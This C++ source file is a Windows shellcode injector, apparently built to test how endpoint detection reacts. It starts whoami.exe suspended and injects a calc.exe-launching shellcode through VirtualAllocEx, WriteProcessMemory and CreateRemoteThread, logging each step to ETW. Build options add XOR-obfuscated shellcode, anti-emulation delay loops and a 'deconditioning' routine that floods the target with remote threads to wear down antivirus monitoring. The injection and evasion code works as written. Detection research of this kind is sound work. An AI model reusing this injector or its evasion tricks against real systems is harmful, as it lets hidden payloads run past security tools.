#include <windows.h>
#include <chrono>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <thread>
#include <TraceLoggingProvider.h>

LPCWSTR procToInject = L"C:\\Windows\\System32\\whoami.exe";

// my attack provider
TRACELOGGING_DEFINE_PROVIDER(
    g_hProvider,
    "Attack-Provider", // name in the ETW
    (0x72248466, 0x7166, 0x4feb, 0xa3, 0x86, 0x34, 0xd8, 0xf3, 0x5b, 0xb6, 0x37)  // a random GUID
);

int sleep_between_steps_ms = 970; // time to wait between attack steps

UINT64 get_ns_time() {
    auto now = std::chrono::system_clock::now();
    return std::chrono::duration_cast<std::chrono::nanoseconds>(now.time_since_epoch()).count();
}

void print_and_emit_event(std::string msg, std::string pre) {
	UINT64 ns = get_ns_time();
    TraceLoggingWrite(
        g_hProvider,
        "AttackTask", // this is the event name
		TraceLoggingValue(msg.c_str(), "message"),
		TraceLoggingUInt64(ns, "ns_since_epoch")
    );
    std::cout << pre << msg << "\n";
}


int main(int argc, char** argv) {
    // start ETW provider
    TraceLoggingRegister(g_hProvider);

    std::ostringstream msg;
    std::string bef = "[<] ";
    std::string aft = "[>]  ";
    std::string fail = "[!] ";
    std::string ok = "[+] ";

    // antiEmulation should be one of the first actions in the EXE
    // deconditioning depends on anti_emulation + obfuscation (anti-signature)
#if defined antiEmulation || defined deconditioning
    msg << "Doing anti emulation calc operations for about 5 sec";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    auto start_ae_calc = std::chrono::high_resolution_clock::now();
    volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
    for (UINT64 n = 2; n <= 10'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
    auto end_ae_calc = std::chrono::high_resolution_clock::now();
    auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
    msg << "Calculated for approximately " << ae_calc_elapsed << " ms";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
#endif

    // print current 
    msg << "Injector started with PID " << GetCurrentProcessId();
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    // handle config selection
    msg << "Running '";
#if defined standard
    msg << "standard";
#elif defined obfuscation
    msg << "obfuscation";
#elif defined antiEmulation
    msg << "antiEmulation+obfuscation";
#elif defined deconditioning
    msg << "deconditioning+antiEmulation+obfuscation";
#else
    msg << "Release";

    // handle start params only in 'Release' config
    enum StartupMode { NoWait, WaitTime, WaitForEnter };
    StartupMode s = NoWait;
    int wait_time = 5;
    if (argc >= 2) {
        if (strcmp(argv[1], "--wait") == 0) {
            s = WaitTime;
        }
        if (strcmp(argv[1], "--wait-enter") == 0) {
            s = WaitForEnter;
        }
    }

    switch (s) {
    case NoWait:
        break;
    case WaitTime:
        for (int i = wait_time; i > 0; i--) {
            std::cout << "[*] Starting injection in " << i << "\n";
            Sleep(1000);
        };
        break;
    case WaitForEnter:
        std::cout << "[*] Press ENTER to start injection...\n";
        std::cin.get();
    default:
        break;
    }
#endif
    msg << "' config";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();

    msg << "Before starting subprocess to inject to";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // start new process to inject to
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(procToInject, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        msg << "[!] Failed to start process: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
    }

    msg << "After starting subprocess with PID " << pi.dwProcessId;
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    msg << "Before opening process handle";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // open process with read/write access
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pi.dwProcessId);
    if (!hProcess) {
        msg << "Failed to open process: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
    }

    msg << "After opening process handle";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

#if defined deconditioning // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
    BYTE nonsense[4096] = {};
    constexpr int rounds = 1000;
    int repetitions = 10; // one repetition is about 0.01 sec (with waiting for thread and freeing memory), according to CPU time with Get-Process
    for (int n = 0; n < repetitions; n++) {

        msg << "Starting deconditioning round " << n;
        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();

        for (int i = 0; i < sizeof(nonsense) / sizeof(nonsense[0]); i++) {
            nonsense[i] = 0x90; // huiiiiiiiiiii
        }
        // xor eax, eax; ret
        nonsense[4093] = 0x31;
        nonsense[4094] = 0xC9;
        nonsense[4095] = 0xC3;

        void* allocs[rounds] = { 0 };
        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
            LPVOID alloc_addr = VirtualAllocEx(hProcess, nullptr, sizeof(nonsense), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!alloc_addr) {
                allocs[i] = 0;
                msg << "Failed to alloc mem in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            allocs[i] = alloc_addr;
            if (!WriteProcessMemory(hProcess, alloc_addr, &nonsense, sizeof(nonsense), NULL)) {
                msg << "Failed to write mem in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            DWORD old_protect;
            if (!VirtualProtectEx(hProcess, alloc_addr, sizeof(nonsense), PAGE_EXECUTE_READ, &old_protect)) {
                msg << "Failed to change mem to RX in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            HANDLE hThreadDecon = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)alloc_addr, nullptr, 0, nullptr);
            if (!hThreadDecon) {
                msg << "Failed to create remote thread in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            else {
                WaitForSingleObject(hThreadDecon, INFINITE);
                CloseHandle(hThreadDecon);
            }

        }

        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
            if (allocs[i] != 0 && !VirtualFreeEx(hProcess, allocs[i], 0, MEM_RELEASE)) {
                msg << "Failed to free mem in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
            }
        }

        msg << "Finished deconditioning round " << n;
        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms * 3); // poor AntiMalware-ETW is too slow to keep up
    }
#endif

    // antiemulation and deconditioning also depend on obfuscation (anti signature)
#if defined obfuscation || defined antiEmulation || defined deconditioning
    msg << "Before decrypting bytes";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
    
    // https://cyberchef.org/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=
    BYTE shellcode[] = { 0xb9,0x0e,0xc6,0xa2,0xb5,0xae,0x85,0x46,0x45,0x46,0x04,0x17,0x04,0x16,0x17,0x17,0x13,0x0e,0x74,0x94,0x20,0x0e,0xce,0x14,0x25,0x0e,0xce,0x14,0x5d,0x0e,0xce,0x14,0x65,0x0e,0xce,0x34,0x15,0x0e,0x4a,0xf1,0x0f,0x0c,0x08,0x77,0x8c,0x0e,0x74,0x86,0xe9,0x7a,0x24,0x3a,0x47,0x6a,0x65,0x07,0x84,0x8f,0x48,0x07,0x44,0x87,0xa7,0xab,0x17,0x07,0x14,0x0e,0xce,0x14,0x65,0xcd,0x07,0x7a,0x0d,0x47,0x95,0xcd,0xc5,0xce,0x45,0x46,0x45,0x0e,0xc0,0x86,0x31,0x21,0x0d,0x47,0x95,0x16,0xce,0x0e,0x5d,0x02,0xce,0x06,0x65,0x0f,0x44,0x96,0xa6,0x10,0x0d,0xb9,0x8c,0x07,0xce,0x72,0xcd,0x0e,0x44,0x90,0x08,0x77,0x8c,0x0e,0x74,0x86,0xe9,0x07,0x84,0x8f,0x48,0x07,0x44,0x87,0x7d,0xa6,0x30,0xb7,0x09,0x45,0x09,0x62,0x4d,0x03,0x7c,0x97,0x30,0x9e,0x1d,0x02,0xce,0x06,0x61,0x0f,0x44,0x96,0x23,0x07,0xce,0x4a,0x0d,0x02,0xce,0x06,0x59,0x0f,0x44,0x96,0x04,0xcd,0x41,0xce,0x0d,0x47,0x95,0x07,0x1d,0x07,0x1d,0x18,0x1c,0x1c,0x04,0x1e,0x04,0x1f,0x04,0x1c,0x0d,0xc5,0xa9,0x66,0x04,0x14,0xba,0xa6,0x1d,0x07,0x1c,0x1c,0x0d,0xcd,0x57,0xaf,0x12,0xb9,0xba,0xb9,0x18,0x0e,0xff,0x47,0x45,0x46,0x45,0x46,0x45,0x46,0x45,0x0e,0xc8,0xcb,0x44,0x47,0x45,0x46,0x04,0xfc,0x74,0xcd,0x2a,0xc1,0xba,0x93,0xfe,0xb6,0xf0,0xe4,0x13,0x07,0xff,0xe0,0xd0,0xfb,0xd8,0xb9,0x90,0x0e,0xc6,0x82,0x6d,0x7a,0x43,0x3a,0x4f,0xc6,0xbe,0xa6,0x30,0x43,0xfe,0x01,0x56,0x34,0x2a,0x2c,0x45,0x1f,0x04,0xcf,0x9f,0xb9,0x90,0x25,0x24,0x2a,0x26,0x68,0x20,0x3e,0x20,0x46 };
    for (size_t i = 0; i < sizeof(shellcode); ++i) { shellcode[i] ^= ((i & 1) == 0 ? 0x45 : 0x46); }
    
    msg << "After decrypting bytes";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms); 
#else
    // byte array of value to write
    // $f = "$(pwd)\file.bin"; $bytes = [IO.File]::ReadAllBytes($f); $s = 'BYTE shellcode[] = { ' + (($bytes | ForEach-Object { '0x{0:X2}' -f $_ }) -join ', ') + ' };'; sc -Path "$f.arr" -Value $s
    BYTE shellcode[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00 };
#endif

    msg << "Before allocating memory for bytes";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // allocate memory to new process
    LPVOID remote_addr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remote_addr) {
        msg << "After allocating memory for bytes at " << (void*)remote_addr;
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Failed to allocate memory: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
    }

    msg << "Before writing bytes to process";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // write value into process' memory
    SIZE_T bytes_written;
    if (WriteProcessMemory(hProcess, remote_addr, &shellcode, sizeof(shellcode), &bytes_written)) {
        msg << "After writing bytes to process at " << (void*)remote_addr;
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Failed to write memory: " << GetLastError();
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        return 1;
    }

    msg << "Before changing memory protection to PAGE_EXECUTE_READ";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // change memory protection to executable
    DWORD old_protect;
    if (VirtualProtectEx(hProcess, remote_addr, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect)) {
        msg << "After changing memory protection to PAGE_EXECUTE_READ";
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Failed to change memory protection: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    msg << "Before creating remote thread";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

	// call create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_addr, nullptr, 0, nullptr);
    if (hThread) {
        msg << "After creating remote thread";
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
		Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Failed to create remote thread: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
	}

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    msg << "Attack done";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    TraceLoggingUnregister(g_hProvider);
    return 0;
}
